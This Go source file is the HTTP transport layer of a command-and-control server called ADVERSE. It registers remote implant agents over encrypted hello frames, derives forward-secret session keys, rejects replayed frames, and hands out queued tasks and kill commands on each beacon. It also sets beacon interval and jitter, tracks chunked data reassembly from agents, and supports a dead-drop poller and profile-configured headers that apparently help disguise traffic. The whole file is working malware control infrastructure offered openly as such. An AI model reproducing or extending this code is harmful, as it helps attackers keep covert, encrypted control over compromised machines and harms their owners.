// Package transport implements the HTTP handler for the ADVERSE C2 server wire
// contract. It handles HTTPS POST to "/" with one envelope frame per request,
// performs hello/bootstrap registration or session-frame decryption, dispatches
// messages to the server core, and returns one envelope frame per response.
//
// Wire contract:
//   - HTTPS POST to "/" (any path); body = ONE envelope frame.
//   - prefix[3] || u32 seq BE || u32 len BE || nonce[12] || ct || tag[16]
//   - Read body with 2MB limit (http.MaxBytesReader) -> 413 over limit.
//   - 405 for non-POST.
//   - Registration/hello: prefix LegacyMagic "SX1", bootstrap key, AAD empty, seq 0.
//   - Session frames: per-agent session key, derived prefix, direction AAD.
//
// ProcessFrame is the transport-agnostic core: it consumes one envelope frame
// and produces the response frame (or an error). Both the HTTP handler and the
// dead-drop poller (internal/drop) execute the identical wire logic.
package transport

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"time"

	"github.com/ashwnn/adverse-go/internal/message"
	"github.com/ashwnn/adverse-go/internal/server"
	"github.com/ashwnn/adverse-go/internal/wire"
)

const (
	// MaxBodySize is the maximum allowed request body size (2MB).
	MaxBodySize = 2 * 1024 * 1024
)

// Handler implements http.Handler for the ADVERSE C2 wire contract.
type Handler struct {
	Server *server.Server
	Logger *slog.Logger
}

// NewHandler creates a new transport Handler wrapping the given server.
func NewHandler(s *server.Server, logger *slog.Logger) *Handler {
	if logger == nil {
		logger = slog.Default()
	}
	return &Handler{Server: s, Logger: logger}
}

// ServeHTTP implements http.Handler. Non-POST returns 405; body is read under
// MaxBodySize; the frame is processed by ProcessFrame and the response frame
// (or error text) is written.
func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Only POST allowed
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read body with 2MB limit
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, MaxBodySize))
	if err != nil {
		http.Error(w, "payload too large", http.StatusRequestEntityTooLarge)
		return
	}

	status, resp := h.ProcessFrame(body)
	if status != http.StatusOK {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(status)
		w.Write(resp)
		return
	}
	h.applyHeaders(w)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	w.Write(resp)
}

// ProcessFrame is the transport-agnostic core of the wire contract. It consumes
// one envelope frame body and returns the HTTP status and response bytes:
//   - 200 with a wire frame (hello-ack, task, beacon, kill) on success
//   - 4xx/5xx with an error message otherwise
//
// The dead-drop poller invokes this directly; the HTTP handler wraps it.
func (h *Handler) ProcessFrame(body []byte) (int, []byte) {
	if len(body) < 11 { // minimum: 3 prefix + 4 seq + 4 len
		return http.StatusBadRequest, []byte("frame too short")
	}

	// Dispatch based on frame content
	bootstrapKey := h.Server.ComputeBootstrapKey()

	// (1) Try bootstrap/hello parse with LegacyMagic, empty AAD
	plain, _, complete, err := wire.Parse(body, bootstrapKey[:], []byte(wire.LegacyMagic), nil, wire.DirectionClientToServer)
	if err == nil && complete {
		return h.handleHello(plain)
	}
	// If it was an auth failure on a LegacyMagic-matching frame, fail closed
	if err != nil {
		if envErr, ok := err.(*wire.EnvelopeError); ok {
			if envErr.Msg != "bad prefix" {
				// Auth failure on a frame with correct prefix -> fail closed
				return http.StatusBadRequest, []byte("auth failure")
			}
		}
	}

	// (2) Try registered agent session frames
	agents := h.Server.ListAgentIDs()
	for _, agentID := range agents {
		snap, ok := h.Server.SnapshotAgentRecord(agentID)
		if !ok {
			continue
		}
		// Client->server uses agent_id+":out" as AAD
		aad := []byte(agentID + ":out")
		plain, seq, complete, err := wire.Parse(body, snap.SessionKey[:], snap.Prefix[:], aad, wire.DirectionClientToServer)
		if err != nil {
			if envErr, ok := err.(*wire.EnvelopeError); ok {
				if envErr.Msg == "bad prefix" {
					continue // not this agent, try next
				}
			}
			// Auth failure on a prefix-matching frame: fail closed
			return http.StatusBadRequest, []byte("auth failure")
		}
		if !complete {
			return http.StatusBadRequest, []byte("incomplete frame")
		}

		// Replay window check — serialized under server.mu to prevent TOCTOU.
		if !h.Server.CheckAndRecordRx(agentID, seq) {
			h.Logger.Info("replay rejected", "agent", agentID, "seq", seq)
			frame, err := h.beaconFrame(snap, agentID)
			if err != nil {
				h.Logger.Warn("failed to build replay beacon", "agent", agentID, "err", err)
				return http.StatusInternalServerError, []byte("internal error")
			}
			return http.StatusOK, frame
		}

		// Parse and validate the message
		var msg map[string]any
		if err := json.Unmarshal(plain, &msg); err != nil {
			return http.StatusBadRequest, []byte("bad json")
		}
		if err := message.Validate(msg); err != nil {
			return http.StatusBadRequest, []byte("invalid message")
		}

		// Dispatch to server
		h.Server.HandleMessage(agentID, msg)

		// Build response: only a beacon consumes a queued task. Ack/result
		// frames are one-way reports whose response body the agent does not
		// act on for tasking, so dequeueing here would mark a queued kill or
		// task dispatched/completed without the agent ever seeing it.
		msgType, _ := msg["type"].(string)
		var frame []byte
		var frameErr error
		if msgType == "beacon" {
			frame, frameErr = h.responseFrame(snap, agentID)
		} else {
			frame, frameErr = h.beaconFrame(snap, agentID)
		}
		if frameErr != nil {
			h.Logger.Warn("failed to build response frame", "agent", agentID, "err", frameErr)
			return http.StatusInternalServerError, []byte("internal error")
		}
		return http.StatusOK, frame
	}

	// (3) Unrecognized frame
	return http.StatusBadRequest, []byte("unrecognized frame")
}

// handleHello processes a hello/registration frame and returns the hello-ack
// frame (200) or an error.
func (h *Handler) handleHello(plain []byte) (int, []byte) {
	var msg map[string]any
	if err := json.Unmarshal(plain, &msg); err != nil {
		return http.StatusBadRequest, []byte("bad json")
	}
	if err := message.Validate(msg); err != nil {
		return http.StatusBadRequest, []byte("invalid message")
	}
	msgType, _ := msg["type"].(string)
	if msgType != "hello" {
		return http.StatusBadRequest, []byte("first frame must be hello")
	}
	agentID, _ := msg["agent_id"].(string)

	// Register the agent
	rec := h.Server.RegisterAgent(agentID, msg)
	if rec == nil {
		return http.StatusBadRequest, []byte("registration failed")
	}

	// Reply with a hello-ack frame. It is encrypted under the static-ECDH
	// handshake key (authenticates the server) and carries the server's
	// per-session ephemeral public key so the agent can derive the
	// forward-secret session key.
	frame, err := h.helloAckFrame(agentID)
	if err != nil {
		h.Logger.Warn("failed to build hello-ack frame", "agent", agentID, "err", err)
		return http.StatusInternalServerError, []byte("internal error")
	}
	return http.StatusOK, frame
}

// helloAckFrame builds the hello acknowledgement frame. It is encrypted under
// the handshake key (static server ECDH) and includes the server's single-use
// ephemeral public key. The client uses that key to derive the forward-secret
// session key used for all subsequent traffic.
func (h *Handler) helloAckFrame(agentID string) ([]byte, error) {
	snap, ok := h.Server.SnapshotAgentRecord(agentID)
	if !ok {
		return nil, fmt.Errorf("no snapshot for %s", agentID)
	}
	seq, ok := h.Server.NextTxSeq(agentID)
	if !ok {
		return nil, fmt.Errorf("no tx seq for %s", agentID)
	}
	payload := fmt.Sprintf(`{"interval":%d,"jitter":%d,"server_eph_pub":%q}`,
		h.Server.BeaconIntervalS, h.Server.BeaconJitterS, hex.EncodeToString(snap.ServerEphPub[:]))
	beacon := message.Make("beacon", agentID, "hello-ack", payload, float64(time.Now().Unix()))
	raw, err := json.Marshal(beacon)
	if err != nil {
		return nil, err
	}

	// Server->client uses agent_id+":in" as AAD
	aad := []byte(agentID + ":in")

	frame, err := wire.Build(raw, snap.HandshakeKey[:], snap.HandshakePrefix[:], aad, seq, wire.DirectionServerToClient)
	if err != nil {
		return nil, err
	}
	return frame, nil
}

// responseFrame builds the response to a beacon: the oldest queued task (one
// per response) or a beacon if the queue is empty. It dequeues (and therefore
// consumes) a task, so it must only be used for beacon/hello frames — never
// for ack/result frames, whose response body the agent does not task from.
func (h *Handler) responseFrame(snap server.AgentRecordSnapshot, agentID string) ([]byte, error) {
	// Pop the oldest queued task (one frame per response); the server marks it
	// dispatched and tracks its lifecycle.
	if msg, ok := h.Server.NextTask(agentID); ok {
		raw, err := json.Marshal(msg)
		if err != nil {
			return nil, fmt.Errorf("marshal task message: %w", err)
		}
		seq, ok := h.Server.NextTxSeq(agentID)
		if !ok {
			return nil, fmt.Errorf("no tx seq for %s", agentID)
		}
		aad := []byte(agentID + ":in")
		frame, err := wire.Build(raw, snap.SessionKey[:], snap.Prefix[:], aad, seq, wire.DirectionServerToClient)
		if err != nil {
			return nil, fmt.Errorf("build task frame: %w", err)
		}
		return frame, nil
	}
	return h.beaconFrame(snap, agentID)
}

// beaconFrame builds a beacon response using a snapshot and serialized seq
// allocation. The payload carries the base interval/jitter fields plus, when
// the agent has live chunk reassembly state, a bounded additive "jobs" array
// (JobProgress) so the agent can resend only missing sequence numbers, prune
// acknowledged chunks, and detect completion. With no jobs the payload is
// byte-for-byte identical to the original beacon payload.
func (h *Handler) beaconFrame(snap server.AgentRecordSnapshot, agentID string) ([]byte, error) {
	payload := fmt.Sprintf(`{"interval":%d,"jitter":%d`, h.Server.BeaconIntervalS, h.Server.BeaconJitterS)
	if jobs := h.Server.JobProgressForAgent(agentID); len(jobs) > 0 {
		jobsJSON, err := json.Marshal(jobs)
		if err != nil {
			return nil, fmt.Errorf("marshal job progress: %w", err)
		}
		payload += `,"jobs":` + string(jobsJSON)
	}
	payload += `}`
	beacon := message.Make("beacon", agentID, "hello-ack", payload, float64(time.Now().Unix()))
	raw, err := json.Marshal(beacon)
	if err != nil {
		return nil, err
	}
	aad := []byte(agentID + ":in")
	seq, ok := h.Server.NextTxSeq(agentID)
	if !ok {
		return nil, fmt.Errorf("no tx seq for %s", agentID)
	}
	frame, err := wire.Build(raw, snap.SessionKey[:], snap.Prefix[:], aad, seq, wire.DirectionServerToClient)
	if err != nil {
		return nil, err
	}
	return frame, nil
}

// applyHeaders sets response headers from the profile config.
func (h *Handler) applyHeaders(w http.ResponseWriter) {
	for k, v := range h.Server.GetResponseHeaders() {
		w.Header().Set(k, v)
	}
}
